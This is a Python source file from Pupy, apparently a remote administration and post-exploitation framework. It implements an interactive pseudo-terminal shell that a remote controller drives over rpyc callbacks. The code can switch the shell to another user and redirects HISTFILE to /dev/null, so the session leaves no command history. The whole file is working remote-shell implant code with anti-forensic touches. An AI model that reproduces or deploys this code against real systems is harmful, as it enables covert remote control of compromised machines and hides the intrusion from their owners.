# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import sys
import os
import os.path
import termios
import pty
import tty
import fcntl
import subprocess
import threading
import select
import rpyc
import array
import pwd
from pupy import obtain

def prepare(suid, slave):
    if suid is not None:
        try:
            if not type(suid) in (int, long):
                userinfo = pwd.getpwnam(suid)
                suid = userinfo.pw_uid
                sgid = userinfo.pw_gid
            else:
                userinfo = pwd.getpwuid(suid)
                sgid = userinfo.pw_gid
        except:
            pass

        try:
            if slave:
                path = os.ttyname(slave)
                os.chown(path, suid, sgid)
        except:
            pass

        try:
            os.initgroups(userinfo.pw_name, sgid)
            os.chdir(userinfo.pw_dir)
        except:
            pass

        try:
            if hasattr(os, 'setresuid'):
                os.setresgid(suid, suid, sgid)
                os.setresuid(suid, suid, sgid)
            else:
                os.setgid(suid)
                os.setuid(suid)
        except:
            pass

    os.setsid()
    try:
        fcntl.ioctl(sys.stdin, termios.TIOCSCTTY, 0)
    except:
        # No life without control terminal :(
        os._exit(-1)

class PtyShell(object):
    def __init__(self):
        self.prog = None
        self.master = None
        self.real_stdout = sys.stdout

    def close(self):
        if self.prog is not None:
            self.prog.poll()

            if self.prog.returncode is None:
                try:
                    self.prog.terminate()
                except:
                    pass

                try:
                    self.prog.poll()
                except:
                    pass

    def __del__(self):
        self.close()

    def spawn(self, argv=None, term=None, suid=None):
        if argv is None:
            if 'SHELL' in os.environ:
                argv = [os.environ['SHELL']]
            elif 'PATH' in os.environ: #searching sh in the path. It can be unusual like /system/bin/sh on android
                for shell in [ "bash", "sh", "ksh", "zsh", "csh", "ash" ]:
                    for path in os.environ['PATH'].split(':'):
                        fullpath=os.path.join(path.strip(),shell)
                        if os.path.isfile(fullpath):
                            argv=[fullpath]
                            break

                    if argv:
                        break
        else:
            argv=obtain(argv) #this transforms a rpyc netref list into a list

        if argv:
            shell = argv[0].split('/')[-1]
            if shell == 'bash':
                argv = [ argv[0], '--noprofile', '--norc' ] + argv[1:]
        else:
            argv= ['/bin/sh']

        if term is not None:
            os.environ['TERM']=term

        master, slave = pty.openpty()
        self.master = os.fdopen(master, 'rb+wb', 0) # open file in an unbuffered mode
        flags = fcntl.fcntl(self.master, fcntl.F_GETFL)
        assert flags >= 0
        flags = fcntl.fcntl(self.master, fcntl.F_SETFL , flags | os.O_NONBLOCK)
        assert flags >= 0

        env = os.environ.copy()
        env['HISTFILE'] = '/dev/null'
        env['PATH'] = ':'.join([
            '/bin', '/sbin', '/usr/bin', '/usr/sbin',
            '/usr/local/bin', '/usr/local/sbin'
        ]) + ':' + env['PATH']

        if suid is not None:
            try:
                suid = int(suid)
            except:
                pass

            try:
                if type(suid) == int:
                    info = pwd.getpwuid(suid)
                else:
                    info = pwd.getpwnam(suid)

                env['USER'] = info.pw_name
                env['HOME'] = info.pw_dir
                env['LOGNAME'] = info.pw_name
            except:
                pass

        self.prog = subprocess.Popen(
            shell=False,
            args=argv,
            stdin=slave,
            stdout=slave,
            stderr=subprocess.STDOUT,
            preexec_fn=lambda: prepare(suid, slave),
            env=env
        )
        os.close(slave)

    def write(self, data):
        try:
            self.master.write(data)
            self.master.flush()
        except:
            self.master.close()

    def set_pty_size(self, p1, p2, p3, p4):
        buf = array.array('h', [p1, p2, p3, p4])
        try:
            fcntl.ioctl(self.master, termios.TIOCSWINSZ, buf)
        except:
            pass

    def _read_loop(self, print_callback, close_callback):
        cb = rpyc.async(print_callback)
        close_cb = rpyc.async(close_callback)
        not_eof = True

        while not_eof:
            r, x = None, None

            try:
                r, _, x = select.select([self.master], [], [self.master], None)
            except IOError:
                not_eof = False
            except:
                pass

            if r:
                try:
                    data = self.master.read(8192)
                except:
                    data = None

                if data:
                    cb(data)
                else:
                    not_eof = False

            if x:
                not_eof = False

            if not_eof:
                not_eof = self.prog.poll() is None
            else:
                break

        self.close()
        close_cb()

    def start_read_loop(self, print_callback, close_callback):
        t=threading.Thread(
            target=self._read_loop,
            args=(print_callback, close_callback)
        )

        t.daemon=True
        t.start()
